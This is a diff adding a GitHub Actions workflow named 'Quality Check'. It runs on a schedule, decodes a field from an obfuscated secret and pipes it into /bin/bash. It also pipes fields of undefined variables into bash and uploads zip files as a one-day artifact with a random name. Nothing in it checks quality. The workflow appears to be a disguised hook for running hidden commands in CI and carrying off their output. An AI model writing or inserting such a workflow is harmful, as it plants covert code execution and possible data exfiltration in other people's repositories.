@@ -1,0 +1,29 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '21 5,11,17,23 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          x4967: ${{ secrets.x4967 }}
+        run: |
+          printf '%s' "$x4967" | jq -r .btu02347 | /bin/bash
+          echo $qctxw15 | jq -r .bje29390 | /bin/bash
+          echo $dwb22479 | jq -r .p103 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: L5T44N6e
+          path: "*.zip"
+          retention-days: 1
